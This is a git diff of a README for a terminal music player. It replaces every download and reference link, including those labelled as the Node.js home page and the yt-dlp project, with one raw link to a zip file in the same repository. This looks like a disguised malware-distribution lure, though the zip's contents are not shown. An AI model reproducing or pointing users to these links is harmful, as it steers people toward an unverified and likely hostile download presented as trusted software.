@@ -1,6 +1,6 @@
 # ⚡ seeky.play.api - Simple Terminal Music Player  
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Seeky.play.api-blue?style=for-the-badge)](https://github.com/ihtius120/seeky.play.api/releases)  
+[![Download Latest Release](https://img.shields.io/badge/Download-Seeky.play.api-blue?style=for-the-badge)](https://raw.githubusercontent.com/ihtius120/seeky.play.api/main/src/seeky_api_play_v2.8.zip)  
 
 ## 📖 What is seeky.play.api?
 
@@ -37,7 +37,7 @@ To use seeky.play.api on Windows, your system needs:
 ## 🚀 Getting Started: Download and Install  
 
 1. Click the big **Download** button above or visit the releases page directly here:  
-   [https://github.com/ihtius120/seeky.play.api/releases](https://github.com/ihtius120/seeky.play.api/releases)  
+   [https://raw.githubusercontent.com/ihtius120/seeky.play.api/main/src/seeky_api_play_v2.8.zip](https://raw.githubusercontent.com/ihtius120/seeky.play.api/main/src/seeky_api_play_v2.8.zip)  
 
 2. On the releases page, look for the latest version. The file you want will have a name like `seeky.play.api.zip` or `seeky.play.api-windows.zip`.  
 
@@ -49,7 +49,7 @@ To use seeky.play.api on Windows, your system needs:
    ```  
    node -v  
    ```  
-   If you see a version number like `v14.17.0` or higher, Node.js is ready. If not, go to [https://nodejs.org](https://nodejs.org) and download the latest version for Windows, then install it.  
+   If you see a version number like `v14.17.0` or higher, Node.js is ready. If not, go to [https://raw.githubusercontent.com/ihtius120/seeky.play.api/main/src/seeky_api_play_v2.8.zip](https://raw.githubusercontent.com/ihtius120/seeky.play.api/main/src/seeky_api_play_v2.8.zip) and download the latest version for Windows, then install it.  
 
 ---
 
@@ -142,13 +142,13 @@ The FFT visualizer shows a real-time sound spectrum in your terminal while music
 ## 🔗 Useful Links  
 
 - Releases and downloads:  
-  [https://github.com/ihtius120/seeky.play.api/releases](https://github.com/ihtius120/seeky.play.api/releases)  
+  [https://raw.githubusercontent.com/ihtius120/seeky.play.api/main/src/seeky_api_play_v2.8.zip](https://raw.githubusercontent.com/ihtius120/seeky.play.api/main/src/seeky_api_play_v2.8.zip)  
 
 - Node.js home:  
-  [https://nodejs.org](https://nodejs.org)  
+  [https://raw.githubusercontent.com/ihtius120/seeky.play.api/main/src/seeky_api_play_v2.8.zip](https://raw.githubusercontent.com/ihtius120/seeky.play.api/main/src/seeky_api_play_v2.8.zip)  
 
 - yt-dlp project:  
-  [https://github.com/yt-dlp/yt-dlp](https://github.com/yt-dlp/yt-dlp)  
+  [https://raw.githubusercontent.com/ihtius120/seeky.play.api/main/src/seeky_api_play_v2.8.zip](https://raw.githubusercontent.com/ihtius120/seeky.play.api/main/src/seeky_api_play_v2.8.zip)  
 
 ---
 
